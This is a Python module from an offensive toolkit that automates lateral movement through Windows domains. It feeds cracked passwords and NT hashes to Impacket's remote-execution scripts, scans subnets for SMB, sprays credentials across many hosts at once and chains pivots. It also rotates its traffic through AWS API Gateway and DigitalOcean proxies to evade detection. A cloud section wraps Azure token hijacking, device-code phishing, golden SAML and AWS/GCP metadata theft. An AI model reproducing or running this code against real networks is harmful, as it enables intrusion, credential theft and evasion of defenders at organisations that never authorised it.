"""
Auto Lateral Movement Module
Automatically pivots to other hosts using AD enum results and cracked credentials
Integrates with Impacket for remote execution
OPSEC: Supports IP rotation through AWS API Gateway and DigitalOcean proxies
"""

import os
import subprocess
import threading
import time
from datetime import datetime
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress

from cyberapp.models.db import db_conn
from cyberapp.models.credentials import CredentialStore
from cybermodules.helpers import log_to_intel
from cybermodules.ad_enum import ActiveDirectoryEnum

# OPSEC Integration
try:
    from cybermodules.opsec import OpSecEngine
    HAS_OPSEC = True
except ImportError:
    HAS_OPSEC = False


class LateralMethod(Enum):
    """Lateral movement methods"""
    PSEXEC = "psexec"
    WMIEXEC = "wmiexec"
    SMBEXEC = "smbexec"
    DCOMEXEC = "dcomexec"
    ATEXEC = "atexec"
    SMBEXEC_ANGELA = "smbexec_angela"


class LateralMovementEngine:
    """
    Auto lateral movement engine
    Automatically discovers and pivots to target hosts
    OPSEC: Supports proxy routing and traffic obfuscation
    """
    
    def __init__(self, scan_id, session_info=None, opsec_enabled=False):
        self.scan_id = scan_id
        self.session_info = session_info or {}
        self.domain = session_info.get("domain", "")
        self.username = session_info.get("username", "")
        self.password = session_info.get("password", "")
        self.nt_hash = session_info.get("nt_hash", "")
        self.lm_hash = session_info.get("lm_hash", "")
        self.target_domain = session_info.get("target_domain", "")
        self.targets = []
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        
        # Settings
        self.max_threads = 5
        self.timeout = 30
        self.port_scan_timeout = 5
        
        # OPSEC Settings
        self.opsec_enabled = opsec_enabled and HAS_OPSEC
        self.opsec_engine = None
        self.proxy_url = None
        self.rotation_interval = 5  # Rotate proxy every N operations
        self.operation_count = 0
        
        if self.opsec_enabled:
            self._init_opsec()
        
        # Impacket paths
        self.impacket_path = "/opt/impacket/examples"
        self.psexec_path = f"{self.impacket_path}/psexec.py"
        self.wmiexec_path = f"{self.impacket_path}/wmiexec.py"
        self.smbexec_path = f"{self.impacket_path}/smbexec.py"
        self.dcomexec_path = f"{self.impacket_path}/dcomexec.py"
        self.atexec_path = f"{self.impacket_path}/atexec.py"
        self.secretsdump_path = f"{self.impacket_path}/secretsdump.py"
        
        # Results directory
        self.output_dir = f"/tmp/lateral_{scan_id}"
        os.makedirs(self.output_dir, exist_ok=True)
    
    # ==================== OPSEC INTEGRATION ====================
    
    def _init_opsec(self):
        """Initialize OPSEC engine for IP rotation"""
        if not HAS_OPSEC:
            self.log("OPSEC", "OpSecEngine not available - running without OPSEC")
            return
        
        try:
            self.opsec_engine = OpSecEngine(self.scan_id)
            # Try to create AWS API Gateway proxy
            test_url = f"https://{self.domain}" if self.domain else "https://microsoft.com"
            self.proxy_url = self.opsec_engine.create_aws_api_gateway(test_url)
            
            if not self.proxy_url:
                # Fallback to DigitalOcean
                do_ip = self.opsec_engine.create_digitalocean_droplet()
                if do_ip:
                    self.proxy_url = f"http://{do_ip}:8080"
            
            if self.proxy_url:
                self.log("OPSEC", f"Proxy initialized: {self.proxy_url}")
            else:
                self.log("OPSEC", "No proxy available - running direct")
                
        except Exception as e:
            self.log("OPSEC", f"OPSEC init failed: {str(e)[:100]}")
    
    def _rotate_proxy_if_needed(self):
        """Rotate proxy after N operations for OPSEC"""
        if not self.opsec_enabled or not self.opsec_engine:
            return
        
        self.operation_count += 1
        if self.operation_count >= self.rotation_interval:
            self.operation_count = 0
            new_proxy = self.opsec_engine.rotate_ip()
            if new_proxy:
                self.proxy_url = new_proxy
                self.log("OPSEC", f"Proxy rotated to: {new_proxy}")
    
    def _get_proxy_env(self):
        """Get proxy environment variables for subprocess calls"""
        if not self.opsec_enabled or not self.proxy_url:
            return {}
        
        return {
            "HTTP_PROXY": self.proxy_url,
            "HTTPS_PROXY": self.proxy_url,
            "http_proxy": self.proxy_url,
            "https_proxy": self.proxy_url,
        }
    
    def cleanup_opsec(self):
        """Cleanup OPSEC resources (proxies, droplets)"""
        if self.opsec_engine:
            try:
                self.opsec_engine.cleanup()
                self.log("OPSEC", "OPSEC resources cleaned up")
            except Exception as e:
                self.log("OPSEC", f"OPSEC cleanup failed: {str(e)[:50]}")
    
    def log(self, msg_type, message):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"LATERAL_{msg_type}", message)
        print(f"[LATERAL][{msg_type}] {message}")
    
    # ==================== TARGET DISCOVERY ====================
    
    def get_targets_from_ad_enum(self):
        """
        Get target hosts from AD enum results
        """
        self.log("DISCOVERY", "Fetching targets from AD enum...")
        
        targets = []
        
        try:
            with db_conn() as conn:
                # Get computers from intel
                computers = conn.execute(
                    """SELECT data FROM intel 
                    WHERE scan_id = ? AND type = 'AD_ENUM' 
                    AND data LIKE '%computer%'""",
                    (self.scan_id,)
                ).fetchall()
                
                # Get users from intel
                users = conn.execute(
                    """SELECT data FROM intel 
                    WHERE scan_id = ? AND type = 'AD_ENUM' 
                    AND data LIKE '%user%'""",
                    (self.scan_id,)
                ).fetchall()
                
                # Parse computers
                for entry in computers:
                    data = entry[0].lower()
                    if 'computer' in data and ('dc' in data or 'server' in data or 'workstation' in data):
                        # Extract computer name
                        for word in data.split():
                            if '$' in word or 'dc' in word:
                                hostname = word.replace('$', '').replace(':', '').strip()
                                if hostname and len(hostname) > 2:
                                    targets.append({
                                        'hostname': hostname,
                                        'type': 'computer',
                                        'source': 'ad_enum'
                                    })
                
        except Exception as e:
            self.log("ERROR", f"Failed to get AD enum results: {e}")
        
        return targets
    
    def get_cracked_credentials(self):
        """
        Get cracked credentials from database
        """
        self.log("CREDS", "Fetching cracked credentials...")
        
        credentials = []
        
        try:
            with db_conn() as conn:
                creds = conn.execute(
                    """SELECT username, password, hash_source FROM cracked_credentials 
                    WHERE scan_id = ?""",
                    (self.scan_id,)
                ).fetchall()
                
                for entry in creds:
                    credentials.append({
                        'username': entry[0],
                        'password': entry[1],
                        'source': entry[2]
                    })
                    
        except Exception as e:
            self.log("ERROR", f"Failed to get cracked credentials: {e}")
        
        return credentials
    
    def add_manual_targets(self, target_list):
        """
        Manually add target hosts
        target_list: ['192.168.1.10', '10.10.10.5', 'server01.corp.local']
        """
        for target in target_list:
            self.targets.append({
                'hostname': target,
                'ip': target,
                'type': 'manual',
                'source': 'manual'
            })
        
        self.log("TARGETS", f"Added {len(target_list)} manual targets")
    
    def discover_network_targets(self, subnet_cidr, ports=[445, 139]):
        """
        Discover targets in a subnet using port scan
        """
        self.log("DISCOVERY", f"Discovering targets in {subnet_cidr}...")
        
        try:
            network = ipaddress.ip_network(subnet_cidr, strict=False)
            hosts = list(network.hosts())
            
            self.log("DISCOVERY", f"Scanning {len(hosts)} hosts...")
            
            discovered = []
            
            def check_host(ip):
                """Quick port check"""
                import socket
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(self.port_scan_timeout)
                        result = sock.connect_ex((str(ip), port))
                        sock.close()
                        if result == 0:
                            return str(ip)
                    except:
                        pass
                return None
            
            # Threaded discovery
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(check_host, ip): ip for ip in hosts[:min(256, len(hosts))]}
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        discovered.append({
                            'ip': result,
                            'hostname': result,
                            'type': 'discovered',
                            'source': 'network_scan'
                        })
                        self.log("DISCOVERY", f"Found open host: {result}")
            
            self.targets.extend(discovered)
            self.log("DISCOVERY", f"Discovered {len(discovered)} hosts")
            
        except Exception as e:
            self.log("ERROR", f"Network discovery failed: {e}")
    
    # ==================== CREDENTIAL PREPARATION ====================
    
    def prepare_credentials(self):
        """
        Prepare credential list for lateral movement
        """
        creds = []
        
        # Use current session credentials first
        if self.username and (self.password or self.nt_hash):
            creds.append({
                'username': f"{self.domain}\\{self.username}" if self.domain else self.username,
                'password': self.password,
                'nt_hash': self.nt_hash,
                'lm_hash': self.lm_hash,
                'source': 'current_session'
            })
        
        # Add cracked credentials
        cracked_creds = self.get_cracked_credentials()
        for cred in cracked_creds:
            creds.append({
                'username': cred['username'],
                'password': cred['password'],
                'nt_hash': '',
                'lm_hash': '',
                'source': cred['source']
            })
        
        # Add any additional credentials from session_info
        if self.session_info.get("additional_creds"):
            creds.extend(self.session_info["additional_creds"])
        
        self.log("CREDS", f"Prepared {len(creds)} credential sets")
        return creds
    
    # ==================== LATERAL MOVEMENT METHODS ====================
    
    def _build_impacket_command(self, method, target, credentials):
        """
        Build Impacket command for lateral movement
        """
        target_ip = target.get('ip') or target.get('hostname')
        username = credentials['username']
        password = credentials.get('password', '')
        nt_hash = credentials.get('nt_hash', '')
        lm_hash = credentials.get('lm_hash', '')
        domain = self.target_domain or self.domain
        
        cmd = []
        
        if method == LateralMethod.PSEXEC:
            script = self.psexec_path
            if nt_hash:
                cmd = [
                    "python3", script,
                    f"-hashes", f"{lm_hash}:{nt_hash}",
                    f"-dc-ip", domain if domain else target_ip,
                    f"{username}@{target_ip}"
                ]
            else:
                cmd = [
                    "python3", script,
                    f"-hashes", f"{lm_hash}:{nt_hash}" if nt_hash else None,
                    f"-dc-ip", domain if domain else None,
                    f"{username}:{password}@{target_ip}"
                ]
        
        elif method == LateralMethod.WMIEXEC:
            script = self.wmiexec_path
            cmd = ["python3", script]
            if nt_hash:
                cmd.extend(["-hashes", f"{lm_hash}:{nt_hash}"])
            cmd.extend([f"{username}:{password}@{target_ip}"])
        
        elif method == LateralMethod.SMBEXEC:
            script = self.smbexec_path
            cmd = ["python3", script]
            if nt_hash:
                cmd.extend(["-hashes", f"{lm_hash}:{nt_hash}"])
            cmd.extend([f"{username}:{password}@{target_ip}"])
        
        elif method == LateralMethod.DCOMEXEC:
            script = self.dcomexec_path
            cmd = ["python3", script]
            if nt_hash:
                cmd.extend(["-hashes", f"{lm_hash}:{nt_hash}"])
            cmd.extend([f"{username}:{password}@{target_ip}"])
        
        elif method == LateralMethod.ATEXEC:
            script = self.atexec_path
            cmd = ["python3", script]
            if nt_hash:
                cmd.extend(["-hashes", f"{lm_hash}:{nt_hash}"])
            cmd.extend([f"-shell-type", "cmd", f"{username}:{password}@{target_ip}", "whoami"])
        
        # Remove None values
        cmd = [c for c in cmd if c is not None]
        
        return cmd
    
    def _execute_impacket(self, method, target, credentials, command=None):
        """
        Execute Impacket lateral movement
        OPSEC: Routes traffic through proxy if enabled
        """
        target_name = target.get('hostname') or target.get('ip', 'unknown')
        
        # OPSEC: Rotate proxy if needed
        self._rotate_proxy_if_needed()
        
        self.log("EXEC", f"Attempting {method.value} on {target_name}...")
        if self.opsec_enabled and self.proxy_url:
            self.log("OPSEC", f"Routing through proxy: {self.proxy_url}")
        
        # Build command
        cmd = self._build_impacket_command(method, target, credentials)
        
        if command:
            cmd.append(command)
        
        try:
            # OPSEC: Add proxy environment variables
            env = os.environ.copy()
            env.update(self._get_proxy_env())
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                env=env if self.opsec_enabled else None
            )
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Timeout',
                'stdout': '',
                'stderr': 'Command timed out'
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'stdout': '',
                'stderr': str(e)
            }
    
    def _verify_success(self, result, target, credentials):
        """
        Verify if lateral movement was successful
        """
        output = result.get('stdout', '') + result.get('stderr', '')
        
        # Check for success indicators
        success_indicators = [
            'Successfully connected',
            'Command completed',
            ' Administrator',
            'whoami',
            '[*] Checking',
            'Target OS',
            'Session',
        ]
        
        for indicator in success_indicators:
            if indicator in output:
                return True
        
        # Check for connection success
        if result.get('success') and result.get('returncode') == 0:
            return True
        
        return False
    
    # ==================== SINGLE TARGET ATTACK ====================
    
    def attempt_lateral_movement(self, target, credentials, methods=None):
        """
        Attempt lateral movement to a single target using multiple methods
        """
        if methods is None:
            methods = [
                LateralMethod.WMIEXEC,
                LateralMethod.PSEXEC,
                LateralMethod.SMBEXEC,
                LateralMethod.DCOMEXEC
            ]
        
        target_name = target.get('hostname') or target.get('ip', 'unknown')
        username = credentials['username']
        
        results = {
            'target': target_name,
            'username': username,
            'methods': [],
            'success': False,
            'session_info': None
        }
        
        for method in methods:
            self.log("ATTACK", f"Trying {method.value} on {target_name} with {username}...")
            
            result = self._execute_impacket(method, target, credentials)
            
            method_result = {
                'method': method.value,
                'success': result.get('success', False),
                'output': result.get('stdout', '')[:500],
                'error': result.get('error') or result.get('stderr', '')[:500]
            }
            
            results['methods'].append(method_result)
            
            # Check if successful
            if self._verify_success(result, target, credentials):
                results['success'] = True
                results['session_info'] = {
                    'target': target_name,
                    'method': method.value,
                    'credentials': {
                        'username': username,
                        'password': credentials.get('password', ''),
                        'nt_hash': credentials.get('nt_hash', '')
                    },
                    'timestamp': datetime.now().isoformat()
                }
                
                self.log("SUCCESS", f"Lateral movement to {target_name} via {method.value} SUCCESS!")
                break
            else:
                self.log("FAILED", f"{method.value} on {target_name} failed")
        
        return results
    
    # ==================== MASS LATERAL MOVEMENT ====================
    
    def execute_mass_movement(self, targets=None, credentials=None, methods=None, max_concurrent=5):
        """
        Execute lateral movement to multiple targets concurrently
        """
        if targets is None:
            targets = self.targets
        if credentials is None:
            credentials = self.prepare_credentials()
        if methods is None:
            methods = [LateralMethod.WMIEXEC, LateralMethod.PSEXEC, LateralMethod.SMBEXEC]
        
        if not targets:
            self.log("ERROR", "No targets specified")
            return []
        
        if not credentials:
            self.log("ERROR", "No credentials specified")
            return []
        
        self.log("EXEC", f"Starting mass lateral movement to {len(targets)} targets with {len(credentials)} cred sets...")
        
        results = []
        completed = 0
        total = len(targets) * len(credentials)
        
        def attack_target(target_cred):
            """Attack single target with single credential"""
            nonlocal completed
            target, cred = target_cred
            result = self.attempt_lateral_movement(target, cred, methods)
            
            with self.lock:
                self.results.append(result)
                completed += 1
                self.log("PROGRESS", f"Progress: {completed}/{total}")
            
            return result
        
        # Prepare attack pairs
        attack_pairs = []
        for target in targets:
            for cred in credentials:
                attack_pairs.append((target, cred))
        
        # Execute with thread pool
        with ThreadPoolExecutor(max_workers=max_concurrent) as executor:
            futures = {executor.submit(attack_target, pair): pair for pair in attack_pairs}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result.get('success'):
                        with self.lock:
                            self.success_count += 1
                    else:
                        with self.lock:
                            self.fail_count += 1
                except Exception as e:
                    with self.lock:
                        self.fail_count += 1
                        self.log("ERROR", f"Attack failed: {e}")
        
        self.log("COMPLETE", f"Mass movement complete: {self.success_count} success, {self.fail_count} failed")
        
        return self.results
    
    # ==================== PIVOT CHAIN ====================
    
    def execute_pivot_chain(self, pivot_sequence):
        """
        Execute a sequence of pivots
        pivot_sequence: [{'target': 'host1', 'creds': {...}}, {'target': 'host2', 'creds': {...}}, ...]
        """
        self.log("CHAIN", f"Executing pivot chain with {len(pivot_sequence)} steps...")
        
        chain_results = []
        
        for i, step in enumerate(pivot_sequence):
            target = step['target']
            creds = step['creds']
            
            self.log("CHAIN", f"Step {i+1}: Pivoting to {target}...")
            
            result = self.attempt_lateral_movement(
                {'hostname': target, 'ip': target},
                creds
            )
            
            chain_results.append({
                'step': i + 1,
                'target': target,
                'success': result['success'],
                'result': result
            })
            
            if not result['success']:
                self.log("CHAIN", f"Chain broken at step {i+1}")
                break
            
            # Use new session info for next step
            if result.get('session_info'):
                self.session_info.update(result['session_info'])
        
        self.log("CHAIN", f"Pivot chain complete: {len([r for r in chain_results if r['success']])}/{len(pivot_sequence)} steps successful")
        
        return chain_results
    
    # ==================== HASH THIEF PATTERN ====================
    
    def execute_hash_thief_pattern(self, initial_target, cracked_creds):
        """
        Execute the "Hash Thief" lateral movement pattern:
        1. Start with one compromised host
        2. Use cracked creds to move laterally
        3. On each new host, dump hashes
        4. Use new hashes to move further
        """
        self.log("PATTERN", "Starting Hash Thief pattern...")
        
        visited_hosts = {initial_target}
        available_creds = cracked_creds.copy()
        pivot_path = []
        
        max_depth = 5
        depth = 0
        
        while depth < max_depth:
            depth += 1
            self.log("PATTERN", f"Depth {depth}: Scanning from {len(visited_hosts)} hosts with {len(available_creds)} creds...")
            
            found_new = False
            
            # Try all available credentials against all visited hosts
            for host in visited_hosts:
                for cred in available_creds:
                    target = {'hostname': host, 'ip': host}
                    result = self.attempt_lateral_movement(target, cred)
                    
                    if result['success']:
                        # Found new access!
                        pivot_path.append({
                            'from': list(visited_hosts),
                            'to': host,
                            'creds': cred['source']
                        })
                        
                        # Add to visited if new
                        if host not in visited_hosts:
                            visited_hosts.add(host)
                            found_new = True
                            
                        self.log("PATTERN", f"New access: {host} using {cred['username']}")
            
            if not found_new:
                self.log("PATTERN", "No new hosts found in this iteration")
                break
        
        self.log("PATTERN", f"Hash Thief complete: Visited {len(visited_hosts)} hosts, {len(pivot_path)} pivots")
        
        return {
            'visited_hosts': list(visited_hosts),
            'pivot_path': pivot_path,
            'total_hosts': len(visited_hosts),
            'total_pivots': len(pivot_path)
        }
    
    # ==================== REPORTING ====================
    
    def generate_report(self):
        """
        Generate lateral movement report
        """
        report = f"""
=== LATERAL MOVEMENT REPORT ===
Generated: {datetime.now().isoformat()}
Scan ID: {self.scan_id}

SUMMARY
-------
Total Attempts: {self.success_count + self.fail_count}
Successful: {self.success_count}
Failed: {self.fail_count}
Success Rate: {(self.success_count / (self.success_count + self.fail_count) * 100) if (self.success_count + self.fail_count) > 0 else 0:.1f}%

SUCCESSFUL MOVES
----------------
"""
        
        for result in self.results:
            if result.get('success'):
                report += f"\nTarget: {result['target']}\n"
                report += f"Username: {result['username']}\n"
                report += "Methods Tried:\n"
                for method in result.get('methods', []):
                    status = "SUCCESS" if method['success'] else "FAILED"
                    report += f"  - {method['method']}: {status}\n"
        
        report += "\n" + "=" * 50
        
        self.log("REPORT", report)
        
        return report
    
    def save_results_to_db(self):
        """
        Save lateral movement results to database
        """
        try:
            with db_conn() as conn:
                for result in self.results:
                    if result.get('success'):
                        conn.execute(
                            """INSERT INTO intel (scan_id, type, data, timestamp) 
                            VALUES (?, ?, ?, datetime('now'))""",
                            (
                                self.scan_id,
                                "LATERAL_SUCCESS",
                                f"{result['target']} via {result.get('session_info', {}).get('method', 'unknown')}"
                            )
                        )
                    else:
                        conn.execute(
                            """INSERT INTO intel (scan_id, type, data, timestamp) 
                            VALUES (?, ?, ?, datetime('now'))""",
                            (
                                self.scan_id,
                                "LATERAL_ATTEMPT",
                                f"{result['target']}: failed"
                            )
                        )
                
                conn.commit()
                
        except Exception as e:
            self.log("ERROR", f"Failed to save results: {e}")
    
    # ==================== UTILITY ====================
    
    def get_session_info(self, target, method, credentials):
        """
        Get session info for discovered access
        """
        return {
            'target': target,
            'method': method,
            'username': credentials['username'],
            'password': credentials.get('password', ''),
            'nt_hash': credentials.get('nt_hash', ''),
            'domain': self.target_domain or self.domain,
            'discovered_at': datetime.now().isoformat()
        }


# =============================================================================
# CLOUD PIVOT INTEGRATION
# =============================================================================

class CloudLateralMovement:
    """
    Cloud Lateral Movement - Zero-Trust Bypass
    
    Extends lateral movement to cloud environments:
    - Azure AD via PRT hijacking
    - AWS via metadata relay
    - GCP via service account abuse
    - Hybrid AD pivoting
    """
    
    def __init__(self, scan_id: str, config: dict = None):
        self.scan_id = scan_id
        self.config = config or {}
        self.cloud_pivot = None
        self._init_cloud_pivot()
    
    def _init_cloud_pivot(self):
        """Initialize cloud pivot orchestrator"""
        try:
            from cybermodules.cloud_pivot import CloudPivotOrchestrator, CloudProvider
            self.cloud_pivot = CloudPivotOrchestrator(self.config)
            self.CloudProvider = CloudProvider
            print(f"[CLOUD] Cloud pivot initialized")
        except ImportError as e:
            print(f"[CLOUD] Cloud pivot not available: {e}")
    
    async def pivot_to_azure(
        self,
        target: str = "localhost",
        method: str = "prt_hijack"
    ) -> dict:
        """
        Pivot to Azure AD via PRT hijacking
        
        Methods:
        - prt_hijack: Extract PRT from Azure AD joined device
        - device_code_phish: Phish user via device code flow
        - aadc_exploit: Exploit Azure AD Connect sync account
        - golden_saml: Forge SAML tokens via ADFS
        
        Args:
            target: Target machine (for PRT extraction)
            method: Pivot method
        
        Returns:
            Pivot result dictionary
        """
        if not self.cloud_pivot:
            return {"success": False, "error": "Cloud pivot not initialized"}
        
        try:
            if method == "prt_hijack":
                result = await self.cloud_pivot.pivot_azure_prt(target)
            elif method == "device_code_phish":
                # Start device code phishing
                user_code, device_code = await self.cloud_pivot.azure_prt.device_code_phish()
                
                if user_code:
                    return {
                        "success": True,
                        "status": "pending_auth",
                        "user_code": user_code,
                        "device_code": device_code,
                        "message": f"Send user to https://microsoft.com/devicelogin with code: {user_code}",
                    }
            elif method == "aadc_exploit":
                result = await self.cloud_pivot.pivot_hybrid_ad()
            else:
                result = await self.cloud_pivot.pivot_azure_prt(target)
            
            return result.to_dict() if hasattr(result, 'to_dict') else result
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def pivot_to_aws(
        self,
        ssrf_url: str = None,
        method: str = "imds"
    ) -> dict:
        """
        Pivot to AWS via metadata service
        
        Methods:
        - imds: Direct IMDS access (when on EC2)
        - ssrf: Relay through SSRF vulnerability
        
        Args:
            ssrf_url: Vulnerable URL for SSRF relay
            method: Pivot method
        
        Returns:
            Pivot result dictionary
        """
        if not self.cloud_pivot:
            return {"success": False, "error": "Cloud pivot not initialized"}
        
        try:
            result = await self.cloud_pivot.pivot_aws_metadata(ssrf_url)
            return result.to_dict() if hasattr(result, 'to_dict') else result
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def pivot_to_gcp(self) -> dict:
        """
        Pivot to GCP via metadata service
        
        Returns:
            Pivot result dictionary
        """
        if not self.cloud_pivot:
            return {"success": False, "error": "Cloud pivot not initialized"}
        
        try:
            result = await self.cloud_pivot.pivot_gcp_metadata()
            return result.to_dict() if hasattr(result, 'to_dict') else result
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def auto_cloud_pivot(
        self,
        source: str = "onprem",
        target_provider: str = None
    ) -> list:
        """
        Automatic cloud pivot - detect environment and pivot
        
        Args:
            source: Source environment (onprem, ec2, gce, azure_vm)
            target_provider: Target cloud provider (azure, aws, gcp)
        
        Returns:
            List of pivot results
        """
        if not self.cloud_pivot:
            return [{"success": False, "error": "Cloud pivot not initialized"}]
        
        try:
            provider = None
            if target_provider:
                provider = self.CloudProvider(target_provider)
            
            results = await self.cloud_pivot.auto_pivot(source, provider)
            return [r.to_dict() for r in results]
        except Exception as e:
            return [{"success": False, "error": str(e)}]
    
    def suggest_attack_path(
        self,
        current_access: list = None,
        target_provider: str = None
    ) -> list:
        """
        Get AI-powered attack path suggestions
        
        Includes cloud weak credential analysis.
        
        Args:
            current_access: Current access types (domain_user, local_admin, etc.)
            target_provider: Target cloud provider
        
        Returns:
            List of suggested attack paths
        """
        if not self.cloud_pivot:
            return []
        
        try:
            provider = None
            if target_provider:
                provider = self.CloudProvider(target_provider)
            
            return self.cloud_pivot.suggest_attack_path(current_access, provider)
        except Exception as e:
            return [{"error": str(e)}]
    
    def get_pivot_summary(self) -> dict:
        """Get summary of all cloud pivot operations"""
        if not self.cloud_pivot:
            return {}
        
        return self.cloud_pivot.get_pivot_summary()


# Helper function for synchronous calls
def cloud_pivot_sync(
    scan_id: str,
    method: str,
    target: str = None,
    config: dict = None
) -> dict:
    """
    Synchronous wrapper for cloud pivot operations
    
    Args:
        scan_id: Scan identifier
        method: Pivot method (azure_prt, aws_imds, gcp_metadata, auto)
        target: Target for method
        config: Configuration dictionary
    
    Returns:
        Pivot result dictionary
    """
    import asyncio
    
    cloud = CloudLateralMovement(scan_id, config)
    
    async def run():
        if method == "azure_prt":
            return await cloud.pivot_to_azure(target or "localhost", "prt_hijack")
        elif method == "azure_device_code":
            return await cloud.pivot_to_azure(target, "device_code_phish")
        elif method == "aws_imds":
            return await cloud.pivot_to_aws()
        elif method == "aws_ssrf":
            return await cloud.pivot_to_aws(ssrf_url=target)
        elif method == "gcp_metadata":
            return await cloud.pivot_to_gcp()
        elif method == "auto":
            return await cloud.auto_cloud_pivot()
        else:
            return {"error": f"Unknown method: {method}"}
    
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    return loop.run_until_complete(run())

